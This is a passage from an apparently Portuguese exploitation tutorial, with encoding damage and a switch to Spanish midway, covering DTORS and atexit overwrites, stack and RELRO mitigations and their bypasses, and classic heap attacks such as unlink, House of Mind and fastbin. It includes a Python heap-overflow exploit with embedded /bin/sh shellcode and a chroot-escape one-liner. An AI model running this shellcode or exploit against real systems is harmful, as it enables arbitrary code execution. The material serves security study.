Hoje em dia √© muito **raro encontrar um bin√°rio com uma se√ß√£o dtor**.
{% endhint %}

Os destrutores s√£o fun√ß√µes que s√£o **executadas antes do programa terminar**.\
Se voc√™ conseguir **escrever** um **endere√ßo** para um **shellcode** em **`__DTOR_END__`**, isso ser√° **executado** antes do programa terminar.\
Obtenha o endere√ßo desta se√ß√£o com:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep ‚Äú__DTOR‚Äù
```
Normalmente voc√™ encontrar√° a se√ß√£o **DTOR** **entre** os valores `ffffffff` e `00000000`. Portanto, se voc√™ apenas ver esses valores, significa que **n√£o h√° nenhuma fun√ß√£o registrada**. Portanto, **sobrescreva** o **`00000000`** com o **endere√ßo** do **shellcode** para execut√°-lo.

### **Strings de Formato para Estouro de Buffer**

O **sprintf move** uma string formatada **para** uma **vari√°vel**. Portanto, voc√™ pode abusar da **formata√ß√£o** de uma string para causar um **estouro de buffer na vari√°vel** para onde o conte√∫do √© copiado.\
Por exemplo, a carga √∫til `%.44xAAAA` ir√° **escrever 44B+"AAAA" na vari√°vel**, o que pode causar um estouro de buffer.

### **Estruturas \_\_atexit**

{% hint style="danger" %}
Atualmente √© muito **incomum explorar isso**.
{% endhint %}

**`atexit()`** √© uma fun√ß√£o para a qual **outras fun√ß√µes s√£o passadas como par√¢metros**. Essas **fun√ß√µes** ser√£o **executadas** ao executar um **`exit()`** ou o **retorno** do **main**.\
Se voc√™ puder **modificar** o **endere√ßo** de qualquer uma dessas **fun√ß√µes** para apontar para um shellcode, por exemplo, voc√™ **obter√° o controle** do **processo**, mas isso √© atualmente mais complicado.\
Atualmente, os **endere√ßos das fun√ß√µes** a serem executadas est√£o **ocultos** por v√°rias estruturas e, finalmente, o endere√ßo para o qual apontam n√£o s√£o os endere√ßos das fun√ß√µes, mas est√£o **criptografados com XOR** e deslocamentos com uma **chave aleat√≥ria**. Portanto, atualmente esse vetor de ataque n√£o √© muito √∫til, pelo menos em x86 e x64\_86.\
A fun√ß√£o de **criptografia** √© **`PTR_MANGLE`**. **Outras arquiteturas** como m68k, mips32, mips64, aarch64, arm, hppa... **n√£o implementam a fun√ß√£o de criptografia** porque **retornam o mesmo** que receberam como entrada. Portanto, essas arquiteturas seriam atac√°veis por esse vetor.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Atualmente √© muito **incomum explorar isso**.
{% endhint %}

**`Setjmp()`** permite **salvar** o **contexto** (os registradores)\
**`longjmp()`** permite **restaurar** o **contexto**.\
Os **registradores salvos** s√£o: `EBX, ESI, EDI, ESP, EIP, EBP`\
O que acontece √© que EIP e ESP s√£o passados pela fun√ß√£o **`PTR_MANGLE`**, ent√£o as **arquiteturas vulner√°veis a esse ataque s√£o as mesmas mencionadas acima**.\
Eles s√£o √∫teis para recupera√ß√£o de erros ou interrup√ß√µes.\
No entanto, pelo que li, os outros registradores n√£o est√£o protegidos, **ent√£o se houver um `call ebx`, `call esi` ou `call edi`** dentro da fun√ß√£o chamada, o controle pode ser assumido. Ou tamb√©m √© poss√≠vel modificar EBP para modificar ESP.

**VTable e VPTR em C++**

Cada classe tem uma **Vtable**, que √© uma matriz de **ponteiros para m√©todos**.

Cada objeto de uma **classe** tem um **VPtr**, que √© um **ponteiro** para a matriz de sua classe. O VPtr faz parte do cabe√ßalho de cada objeto, ent√£o se for alcan√ßada uma **sobrescrita** do **VPtr**, ele pode ser **modificado** para **apontar** para um m√©todo fict√≠cio, de modo que a execu√ß√£o de uma fun√ß√£o v√° para o shellcode.

## **Medidas Preventivas e Evas√µes**

**ASLR n√£o t√£o aleat√≥rio**

O PaX divide o espa√ßo de endere√ßos do processo em 3 grupos:

C√≥digo e dados iniciados e n√£o iniciados: .text, .data e .bss -> 16 bits de entropia na vari√°vel delta\_exec, essa vari√°vel √© iniciada aleatoriamente a cada processo e √© adicionada aos endere√ßos iniciais.

Mem√≥ria alocada por mmap() e bibliotecas compartilhadas -> 16 bits, delta\_mmap

A pilha -> 24 bits, delta\_stack -> Na verdade, 11 (do byte 10¬∫ ao 20¬∫ inclusive) -> alinhado em 16 bytes -> 524.288 poss√≠veis endere√ßos reais da pilha

As vari√°veis de ambiente e os argumentos se deslocam menos que um buffer na pilha.

**Return-into-printf**

√â uma t√©cnica para transformar um estouro de buffer em um erro de string de formato. Consiste em substituir o EIP para que aponte para um printf da fun√ß√£o e passar uma string de formato manipulada como argumento para obter valores sobre o estado do processo.

**Ataque a bibliotecas**

As bibliotecas est√£o em uma posi√ß√£o com 16 bits de aleatoriedade = 65636 poss√≠veis endere√ßos. Se um servidor vulner√°vel chamar o fork(), o espa√ßo de endere√ßos de mem√≥ria √© clonado no processo filho e permanece intacto. Portanto, √© poss√≠vel tentar fazer uma for√ßa bruta na fun√ß√£o usleep() da libc passando "16" como argumento, de modo que, quando ela demorar mais do que o normal para responder, essa fun√ß√£o ser√° encontrada. Sabendo onde est√° essa fun√ß√£o, √© poss√≠vel obter o delta\_mmap e calcular os outros.

A √∫nica maneira de ter certeza de que o ASLR funciona √© usando uma arquitetura de 64 bits. L√°, n√£o h√° ataques de for√ßa bruta.

**StackGuard e StackShield**

**StackGuard** insere antes do EIP -> 0x000aff0d(null, \n, EndOfFile(EOF), \r) -> Ainda s√£o vulner√°veis recv(), memcpy(), read(), bcoy() e n√£o protege o EBP

**StackShield** √© mais elaborado que o StackGuard

Ele armazena em uma tabela (Global Return Stack) todos os endere√ßos de retorno do EIP para que o estouro de buffer n√£o cause nenhum dano. Al√©m disso, os dois endere√ßos podem ser comparados para verificar se houve um estouro de buffer.

Tamb√©m √© poss√≠vel verificar o endere√ßo de retorno com um valor limite, ent√£o, se o EIP for para um local diferente do habitual, como o espa√ßo de dados, ser√° conhecido. Mas isso pode ser contornado com Ret-to-lib, ROPs ou ret2ret.

Como pode ser visto, o stackshield tamb√©m n√£o protege as vari√°veis locais.

**Stack Smash Protector (ProPolice) -fstack-protector**

O can√°rio √© colocado antes do EBP. Ele reorganiza as vari√°veis locais para que os buffers estejam nas posi√ß√µes mais altas e, assim, n√£o possam sobrescrever outras vari√°veis.

Al√©m disso, faz uma c√≥pia segura dos argumentos passados acima da pilha (acima das vars locais) e usa essas c√≥pias como argumentos.

N√£o pode proteger matrizes com menos de 8 elementos ou buffers que fazem parte de uma estrutura do usu√°rio.

O can√°rio √© um n√∫mero aleat√≥rio retirado de "/dev/urandom" ou, se n√£o for poss√≠vel, √© 0xff0a0000. Ele √© armazenado em TLS (Thread Local Storage). As threads compartilham o mesmo espa√ßo de mem√≥ria, o TLS √© uma √°rea que possui vari√°veis globais ou est√°ticas de cada thread. No entanto, em princ√≠pio, essas s√£o copiadas do processo pai, embora o processo filho possa modificar esses dados sem modificar os do pai ou dos outros filhos. O problema √© que, se o fork() for usado, mas um novo can√°rio n√£o for criado, todos os processos (pai e filhos) usar√£o o mesmo can√°rio. No i386, ele √© armazenado em gs:0x14 e no x86\_64, ele √© armazenado em fs:0x28.

Essa prote√ß√£o localiza fun√ß√µes que possuem buffers que podem ser atacados e inclui c√≥digo no in√≠cio da fun√ß√£o para colocar o can√°rio e c√≥digo no final para verific√°-lo.
A fun√ß√£o fork() cria uma c√≥pia exata do processo pai, por isso, se um servidor web chamar o fork(), √© poss√≠vel realizar um ataque de for√ßa bruta byte a byte para descobrir o canary que est√° sendo utilizado.

Se a fun√ß√£o execve() for usada ap√≥s o fork(), o espa√ßo ser√° sobrescrito e o ataque n√£o ser√° mais poss√≠vel. O vfork() permite executar o processo filho sem criar uma duplicata at√© que o processo filho tente escrever, momento em que a duplicata √© criada.

**Relocation Read-Only (RELRO)**

### Relro

**Relro (Read only Relocation)** afeta as permiss√µes de mem√≥ria de forma semelhante ao NX. A diferen√ßa √© que, enquanto o NX torna a pilha execut√°vel, o RELRO torna **certas coisas somente leitura**, impedindo que possamos escrever nelas. A maneira mais comum de encontrar esse obst√°culo √© impedindo que fa√ßamos uma **sobrescrita da tabela `got`**, que ser√° abordada posteriormente. A tabela `got` armazena endere√ßos de fun√ß√µes da libc para que o bin√°rio saiba quais s√£o os endere√ßos e possa cham√°-los. Vamos ver como ficam as permiss√µes de mem√≥ria para uma entrada da tabela `got` em um bin√°rio com e sem relro.

Com relro:
```bash
gef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef‚û§  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
0x555555557fd0 - 0x555555557fe8  ‚Üí   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Sem relro:
```bash
gef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef‚û§  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
0x404018 - 0x404030  ‚Üí   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Para o bin√°rio **sem relro**, podemos ver que o endere√ßo da entrada `got` para `fgets` √© `0x404018`. Ao olhar para os mapeamentos de mem√≥ria, vemos que ele est√° entre `0x404000` e `0x405000`, que possuem as **permiss√µes `rw`**, o que significa que podemos ler e escrever nele. Para o bin√°rio **com relro**, vemos que o endere√ßo da tabela `got` para a execu√ß√£o do bin√°rio (o pie est√° habilitado, ent√£o esse endere√ßo ir√° mudar) √© `0x555555557fd0`. Nos mapeamentos de mem√≥ria desse bin√°rio, ele est√° entre `0x0000555555557000` e `0x0000555555558000`, que possuem a permiss√£o de mem√≥ria **`r`**, o que significa que s√≥ podemos ler dele.

Ent√£o, qual √© o **bypass**? O bypass t√≠pico que eu uso √© simplesmente n√£o escrever em regi√µes de mem√≥ria que o relro faz ficar somente leitura e **encontrar uma maneira diferente de obter a execu√ß√£o de c√≥digo**.

Note que, para que isso aconte√ßa, o bin√°rio precisa conhecer previamente os endere√ßos das fun√ß√µes:

* Lazy binding: O endere√ßo de uma fun√ß√£o √© procurado na primeira vez que a fun√ß√£o √© chamada. Portanto, a `GOT` precisa ter permiss√µes de escrita durante a execu√ß√£o.
* Bind now: Os endere√ßos das fun√ß√µes s√£o resolvidos no in√≠cio da execu√ß√£o e, em seguida, s√£o dadas permiss√µes somente leitura a se√ß√µes sens√≠veis como `.got`, `.dtors`, `.ctors`, `.dynamic`, `.jcr`. `` `** ``-z relro`**`y`**`-z now\`\*\*

Para verificar se um programa usa Bind now, voc√™ pode fazer:
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
Cuando o bin√°rio √© carregado na mem√≥ria e uma fun√ß√£o √© chamada pela primeira vez, ele pula para a PLT (Procedure Linkage Table), a partir daqui ele faz um salto (jmp) para a GOT e descobre que essa entrada n√£o foi resolvida (cont√©m um endere√ßo seguinte da PLT). Portanto, ele invoca o Runtime Linker ou rtfd para resolver o endere√ßo e salv√°-lo na GOT.

Quando uma fun√ß√£o √© chamada, ela chama a PLT, que tem o endere√ßo da GOT onde o endere√ßo da fun√ß√£o √© armazenado, redirecionando o fluxo para l√° e chamando a fun√ß√£o. No entanto, se for a primeira vez que a fun√ß√£o √© chamada, o que est√° na GOT √© a pr√≥xima instru√ß√£o da PLT, portanto, o fluxo segue o c√≥digo da PLT (rtfd) e descobre o endere√ßo da fun√ß√£o, salva-o na GOT e o chama.

Ao carregar um bin√°rio na mem√≥ria, o compilador informa em qual offset os dados devem ser colocados quando o programa √© executado.

Lazy binding -> O endere√ßo da fun√ß√£o √© procurado apenas na primeira vez que a fun√ß√£o √© invocada, ent√£o a GOT tem permiss√µes de escrita para que, quando for procurado, seja salvo l√° e n√£o precise ser procurado novamente.

Bind now -> Os endere√ßos das fun√ß√µes s√£o procurados ao carregar o programa e as permiss√µes das se√ß√µes .got, .dtors, .ctors, .dynamic, .jcr s√£o alteradas para apenas leitura. **-z relro** e **-z now**

Apesar disso, em geral, os programas n√£o s√£o complicados com essas op√ß√µes, ent√£o esses ataques ainda s√£o poss√≠veis.

**readelf -l /proc/ID_PROC/exe | grep BIND_NOW** -> Para saber se usam o BIND NOW

**Fortify Source -D_FORTIFY_SOURCE=1 ou =2**

Tenta identificar fun√ß√µes que copiam de um local para outro de forma insegura e substitui a fun√ß√£o por uma fun√ß√£o segura.

Por exemplo:\
char buf[16];\
strcpy(buf, source);

Ele identifica como inseguro e, em seguida, substitui strcpy() por \_\_strcpy\_chk(), usando o tamanho do buffer como tamanho m√°ximo a ser copiado.

A diferen√ßa entre **=1** ou **=2** √© que:

A segunda n√£o permite que **%n** venha de uma se√ß√£o com permiss√µes de escrita. Al√©m disso, o par√¢metro para acesso direto aos argumentos s√≥ pode ser usado se os anteriores forem usados, ou seja, s√≥ pode ser usado **%3$d** se antes for usado **%2$d** e **%1$d**

Para mostrar a mensagem de erro, usa-se o argv[0], portanto, se for colocado nele o endere√ßo de outro local (como uma vari√°vel global), a mensagem de erro mostrar√° o conte√∫do dessa vari√°vel. Pag 191

**Substitui√ß√£o do Libsafe**

Ativado com: LD_PRELOAD=/lib/libsafe.so.2\
ou\
"/lib/libsave.so.2" > /etc/ld.so.preload

Ele intercepta chamadas a algumas fun√ß√µes inseguras por outras seguras. N√£o √© padronizado. (apenas para x86, n√£o para compila√ß√µes com -fomit-frame-pointer, n√£o para compila√ß√µes est√°ticas, nem todas as fun√ß√µes vulner√°veis se tornam seguras e LD_PRELOAD n√£o funciona em bin√°rios com suid).

**ASCII Armored Address Space**

Consiste em carregar as bibliotecas compartilhadas de 0x00000000 a 0x00ffffff para que sempre haja um byte 0x00. No entanto, isso realmente n√£o impede quase nenhum ataque, especialmente em little endian.

**ret2plt**

Consiste em realizar um ROP de forma que a fun√ß√£o strcpy@plt (da plt) seja chamada e aponte para a entrada da GOT e copie o primeiro byte da fun√ß√£o que se deseja chamar (system()). Em seguida, faz o mesmo apontando para GOT+1 e copia o segundo byte de system()... No final, chama o endere√ßo armazenado na GOT, que ser√° system()

**Falso EBP**

Para fun√ß√µes que usam o EBP como registro para apontar para os argumentos, ao modificar o EIP e apontar para system(), o EBP tamb√©m deve ser modificado para apontar para uma √°rea de mem√≥ria que tenha 2 bytes quaisquer e, em seguida, o endere√ßo de &"/bin/sh".

**Jaulas com chroot()**

debootstrap -arch=i386 hardy /home/user -> Instala um sistema b√°sico em um subdiret√≥rio espec√≠fico

Um administrador pode sair de uma dessas jaulas fazendo: mkdir foo; chroot foo; cd ..

**Instrumenta√ß√£o de c√≥digo**

Valgrind -> Procura por erros\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Heap Overflows: Exploits b√°sicos**

**Chunk alocado**

prev_size |\
size | - Cabe√ßalho\
*mem | Dados

**Chunk livre**

prev_size |\
size |\
*fd | Ptr para o pr√≥ximo chunk\
*bk | Ptr para o chunk anterior - Cabe√ßalho\
*mem | Dados

Os chunks livres est√£o em uma lista duplamente encadeada (bin) e nunca pode haver dois chunks livres juntos (eles s√£o unidos)

No "size", existem bits para indicar: se o chunk anterior est√° em uso, se o chunk foi alocado usando mmap() e se o chunk pertence √† arena prim√°ria.

Ao liberar um chunk, se algum dos chunks cont√≠guos estiver livre, eles s√£o mesclados usando a macro unlink() e o novo chunk maior √© passado para frontlink() para que seja inserido no bin apropriado.

unlink(){\
BK = P->bk; -> O BK do novo chunk √© o que o chunk que j√° estava livre antes tinha\
FD = P->fd; -> O FD do novo chunk √© o que o chunk que j√° estava livre antes tinha\
FD->bk = BK; -> O BK do pr√≥ximo chunk aponta para o novo chunk\
BK->fd = FD; -> O FD do chunk anterior aponta para o novo chunk\
}

Portanto, se conseguirmos modificar P->bk com o endere√ßo de um shellcode e P->fd com o endere√ßo de uma entrada na GOT ou DTORS menos 12, conseguimos:

BK = P->bk = &shellcode\
FD = P->fd = &__dtor_end__ - 12\
FD->bk = BK -> *((&__dtor_end__ - 12) + 12) = &shellcode

E assim, quando o programa √© encerrado, a shellcode √© executada.

Al√©m disso, a quarta instru√ß√£o do unlink() escreve algo e a shellcode precisa ser ajustada para isso:

BK->fd = FD -> *((&shellcode + 8) = (&__dtor_end__ - 12) -> Isso causa a escrita de 4 bytes a partir do 8¬∫ byte da shellcode, ent√£o a primeira instru√ß√£o da shellcode deve ser um jmp para pular isso e chegar a alguns nops que levem ao restante da shellcode.

Portanto, o exploit √© criado:

No buffer1, inserimos a shellcode come√ßando com um jmp para que ele caia nos nops ou no restante da shellcode.
Depois do shell code, preenchemos com dados at√© chegar ao campo prev\_size e size do pr√≥ximo chunk. Nestes locais, inserimos 0xfffffff0 (para sobrescrever o prev\_size e indicar que est√° livre) e "-4" (0xfffffffc) no size (para que, ao verificar o terceiro chunk, ele v√° para o prev\_size modificado e pense que o segundo est√° livre) -> Assim, quando o free() for chamado, ele ir√° para o size do terceiro, mas na verdade ir√° para o segundo - 4 e pensar√° que o segundo chunk est√° livre. E ent√£o ele chamar√° o **unlink()**.

Ao chamar o unlink(), usamos os primeiros dados do segundo chunk como P->fd, ent√£o √© l√° que colocamos o endere√ßo que queremos sobrescrever - 12 (pois ele adicionar√° 12 ao endere√ßo armazenado em FD em BK). E nesse endere√ßo, inserimos o segundo endere√ßo encontrado no segundo chunk, que ser√° o endere√ßo do shell code (P->bk falso).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12 bytes de preenchimento**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I‚Äù, 0xfffffff0) #Interessa que o bit que indica que o chunk anterior est√° livre seja 1**

**fake\_size = pack("\<I‚Äù, 0xfffffffc) #-4, para que ele pense que o "size" do terceiro chunk est√° 4 bytes atr√°s (aponta para prev\_size) onde ele verifica se o segundo chunk est√° livre**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #No payload, no in√≠cio, colocamos 8 bytes de preenchimento**

**got\_free = pack("\<I", 0x08048300 - 12) #Endere√ßo de free() na plt-12 (ser√° o endere√ßo sobrescrito para que o shell code seja executado na segunda chamada a free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Como mencionado, o payload come√ßa com 8 bytes de preenchimento**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Modificamos o segundo chunk, got\_free aponta para onde vamos armazenar o endere√ßo addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() liberando em sentido inverso (wargame)**

Estamos controlando 3 chunks consecutivos e eles s√£o liberados na ordem inversa √† reserva.

Nesse caso:

No chunk c, colocamos o shell code.

Usamos o chunk a para sobrescrever o b de forma que o size tenha o bit PREV\_INUSE desativado, para que ele pense que o chunk a est√° livre.

Al√©m disso, sobrescrevemos o size no cabe√ßalho b para que seja -4.

Ent√£o, o programa pensar√° que "a" est√° livre e em um bin, ent√£o chamar√° o unlink() para desvincul√°-lo. No entanto, como o cabe√ßalho PREV\_SIZE √© -4, ele pensar√° que o chunk "a" realmente come√ßa em b+4. Ou seja, ele far√° um unlink() em um chunk que come√ßa em b+4, ent√£o em b+12 estar√° o ponteiro "fd" e em b+16 estar√° o ponteiro "bk".

Dessa forma, se colocarmos o endere√ßo do shell code em bk e o endere√ßo da fun√ß√£o "puts()" - 12 em fd, teremos nosso payload.

**T√©cnica de Frontlink**

O frontlink √© chamado quando algo √© liberado e nenhum dos chunks adjacentes est√° livre, ent√£o n√£o √© chamado o unlink(), mas sim o frontlink().

Vulnerabilidade √∫til quando o malloc que est√° sendo atacado nunca √© liberado (free()).

Requer:

Um buffer que possa ser estourado com a fun√ß√£o de entrada de dados.

Um buffer cont√≠guo a este que deve ser liberado e cujo campo fd do cabe√ßalho ser√° modificado devido ao estouro do buffer anterior.

Um buffer a ser liberado com um tamanho maior que 512, mas menor que o buffer anterior.

Um buffer declarado antes da etapa 3 que permita sobrescrever o prev\_size deste.

Dessa forma, ao sobrescrever dois mallocs de forma descontrolada e um de forma controlada, mas que √© liberado apenas uma vez, podemos fazer um exploit.

**Vulnerabilidade double free()**

Se free() for chamado duas vezes com o mesmo ponteiro, dois bins apontar√£o para o mesmo endere√ßo.

Se quisermos usar um deles novamente, ele ser√° atribu√≠do sem problemas. Se quisermos usar outro, ele ser√° atribu√≠do ao mesmo espa√ßo, ent√£o teremos os ponteiros "fd" e "bk" falsificados com os dados que a reserva anterior escrever√°.

**After free()**

Um ponteiro previamente liberado √© usado novamente sem controle.

## **8 Heap Overflows: Exploits avan√ßados**

As t√©cnicas Unlink() e FrontLink() foram removidas ao modificar a fun√ß√£o unlink().

**The house of mind**

Apenas uma chamada a free() √© necess√°ria para executar c√≥digo arbitr√°rio. √â interessante encontrar um segundo chunk que possa ser estourado por um anterior e liberado.

Uma chamada a free() faz com que seja chamado public\_fREe(mem), que faz o seguinte:

mstate ar\_ptr;

mchunkptr p;

...

p = mem2chunk(mes); ‚Äî> Retorna um ponteiro para o endere√ßo onde o chunk come√ßa (mem-8)

...

ar\_ptr = arena\_for\_chunk(p); ‚Äî> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

...

\_int\_free(ar\_ptr, mem);

}

Em \[1], ele verifica o campo size do bit NON\_MAIN\_ARENA, que pode ser alterado para que a verifica√ß√£o retorne true e execute heap\_for\_ptr(), que faz um and em "mem", deixando os 2,5 bytes menos significativos como 0 (no nosso caso, de 0x0804a000, deixa 0x08000000) e acessa 0x08000000->ar\_ptr (como se fosse uma struct heap\_info).
De esta forma, podemos controlar un chunk, por exemplo, em 0x0804a000, y cuando se libere un chunk en **0x081002a0**, podemos llegar a la direcci√≥n 0x08100000 y escribir lo que queramos, por ejemplo **0x0804a000**. Cuando se libere este segundo chunk, heap\_for\_ptr(ptr)->ar\_ptr devolver√° lo que hemos escrito en 0x08100000 (ya que se aplica a 0x081002a0 el "and" que vimos antes y de ah√≠ se obtiene el valor de los primeros 4 bytes, el ar\_ptr).

De esta forma, se llama a \_int\_free(ar\_ptr, mem), es decir, **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
‚Ä¶\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Como hemos visto antes, podemos controlar el valor de av, ya que es lo que escribimos en el chunk que se va a liberar.

Tal y como se define unsorted\_chunks, sabemos que:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Por lo tanto, si escribimos el valor de \_\_DTOR\_END\_\_-12 en av->bins\[2], en la √∫ltima instrucci√≥n se escribir√° en \_\_DTOR\_END\_\_ la direcci√≥n del segundo chunk.

Es decir, en el primer chunk tenemos que poner al inicio muchas veces la direcci√≥n de \_\_DTOR\_END\_\_-12 porque de ah√≠ la sacar√° av->bins\[2].

En la direcci√≥n donde caiga la direcci√≥n del segundo chunk con los √∫ltimos 5 ceros, hay que escribir la direcci√≥n de este primer chunk para que heap\_for\_ptr() piense que el ar\_ptr est√° al inicio del primer chunk y saque de ah√≠ el av->bins\[2].

En el segundo chunk, gracias al primero, sobrescribimos el prev\_size con un jump 0x0c y el size con algo para activar -> NON\_MAIN\_ARENA.

A continuaci√≥n, en el chunk 2 ponemos un mont√≥n de nops y finalmente la shellcode.

De esta forma, se llamar√° a \_int\_free(TROZO1, TROZO2) y seguir√° las instrucciones para escribir en \_\_DTOR\_END\_\_ la direcci√≥n del prev\_size del TROZO2, el cual saltar√° a la shellcode.

Para aplicar esta t√©cnica, se necesitan cumplir algunos requisitos adicionales que complican un poco m√°s el payload.

Esta t√©cnica ya no es aplicable, ya que se aplic√≥ casi el mismo parche que para unlink. Se compara si el nuevo sitio al que se apunta tambi√©n le est√° apuntando a √©l.

**Fastbin**

Es una variante de The house of mind.

Nos interesa llegar a ejecutar el siguiente c√≥digo, al cual se llega despu√©s de la primera comprobaci√≥n de la funci√≥n \_int\_free().

fb = &(av->fastbins\[fastbin\_index(size)] ‚Äî> Siendo fastbin\_index(sz) ‚Äî> (sz >> 3) - 2

‚Ä¶

p->fd = \*fb

\*fb = p

De esta forma, si se pone en "fb" la direcci√≥n de una funci√≥n en la GOT, en esta direcci√≥n se pondr√° la direcci√≥n del chunk sobrescrito. Para esto, ser√° necesario que la arena est√© cerca de las direcciones de dtors. M√°s exactamente, que av->max\_fast est√© en la direcci√≥n que vamos a sobrescribir.

Dado que con The House of Mind vimos que nosotros control√°bamos la posici√≥n del av.

Entonces, si en el campo size ponemos un tama√±o de 8 + NON\_MAIN\_ARENA + PREV\_INUSE, fastbin\_index() nos devolver√° fastbins\[-1\], que apuntar√° a av->max\_fast.

En este caso, av->max\_fast ser√° la direcci√≥n que se sobrescribir√° (no a la que apunte, sino esa posici√≥n ser√° la que se sobrescribir√°).

